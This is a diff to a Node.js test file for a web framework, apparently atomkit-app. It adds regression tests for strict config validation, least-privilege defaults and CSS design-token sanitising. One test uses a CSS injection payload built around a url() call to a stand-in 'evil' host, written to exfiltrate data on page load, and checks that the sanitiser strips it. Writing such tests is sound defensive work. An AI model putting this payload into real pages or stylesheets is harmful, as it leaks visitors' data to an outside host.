@@ -1,5 +1,5 @@
 import assert from 'node:assert/strict';
-import { mkdtempSync, existsSync, readFileSync, rmSync } from 'node:fs';
+import { mkdtempSync, existsSync, readFileSync, writeFileSync, rmSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import {
@@ -11,6 +11,7 @@ import {
   build,
   create,
   isPrivateHost,
+  renderContext,
 } from '../dist/index.js';
 
 const json = (obj) => new Response(JSON.stringify(obj), { headers: { 'content-type': 'application/json' } });
@@ -133,7 +134,55 @@ try {
   const manifest = JSON.parse(readFileSync(join(proj, 'dist/routes.json'), 'utf8'));
   assert.equal(manifest.length, 3, 'routes.json lists three pages');
 
-  console.log('✓ atomkit-app tests passed (scaffold, routing, SSR, governance, DATA BINDING [resolve/pii/off-list/unreachable/private-IP], build → HTML + standalone React)');
+  // The ejected component must NOT claim to fetch — it renders the fallback.
+  const dataTsx = readFileSync(join(proj, 'dist/components/Data.tsx'), 'utf8');
+  assert.ok(/does NOT fetch/.test(dataTsx), 'ejected component records that it does not fetch');
+  assert.ok(!/fetch\(/.test(dataTsx), 'ejected component contains no fetch call');
+
+  // ── Regressions ───────────────────────────────────────────────────────────
+  // Config: a governance flag must never be widened by a typo. `"false"` is a
+  // truthy STRING — the most likely JSON mistake — and a `!!` coercion granted
+  // PII visibility, permanently baking it into publicly served HTML.
+  {
+    const bad = mkdtempSync(join(tmpdir(), 'ak-cfg-'));
+    const write = (obj) => writeFileSync(join(bad, 'atomkit.config.json'), JSON.stringify(obj));
+
+    write({ context: { canViewPii: 'false' } });
+    assert.throws(() => loadConfig(bad), /canViewPii.*must be a boolean/s, 'string "false" is rejected, not coerced');
+
+    write({ context: { canViewProtected: 'true' } });
+    assert.throws(() => loadConfig(bad), /canViewProtected/, 'string "true" is rejected too');
+
+    write({ port: '3300' });
+    assert.throws(() => loadConfig(bad), /port.*must be a finite number/s, 'string port rejected');
+
+    write({ data: { allowHosts: 'api.example.com' } });
+    assert.throws(() => loadConfig(bad), /allowHosts.*array of strings/s, 'non-array allowHosts rejected');
+
+    write({ contxt: {} });
+    assert.throws(() => loadConfig(bad), /unknown key "contxt"/, 'typo in a top-level key is caught');
+
+    write({ context: { canViewPii: true } });
+    assert.equal(loadConfig(bad).context.canViewPii, true, 'a real boolean still works');
+
+    write({ context: {} });
+    const ctx = renderContext(loadConfig(bad));
+    assert.equal(ctx.canViewPii, false, 'defaults stay least-privileged');
+    assert.equal(ctx.consent.analytics, false, 'analytics consent defaults off');
+    rmSync(bad, { recursive: true, force: true });
+  }
+
+  // Design tokens are a single CSS value: `;` and `url()` must not survive, or a
+  // token becomes a second declaration on :root and exfiltrates on page load.
+  {
+    const cfg = { ...loadConfig(proj), tokens: { brand: 'red;background:url(https://evil/?leak)', ok: '#0b1220' } };
+    const shell = pageShell({ title: 't', bodyHtml: '', cfg, liveReload: false });
+    assert.ok(!shell.includes('evil'), 'token cannot inject url() exfiltration');
+    assert.ok(!/--brand:/.test(shell), 'hostile token value is dropped entirely');
+    assert.ok(shell.includes('--ok:#0b1220'), 'benign token still emitted');
+  }
+
+  console.log('✓ atomkit-app tests passed (scaffold, routing, SSR, governance, DATA BINDING [resolve/pii/off-list/unreachable/private-IP], build → HTML + standalone React, strict config validation, token CSS sanitising)');
 } finally {
   rmSync(tmp, { recursive: true, force: true });
 }
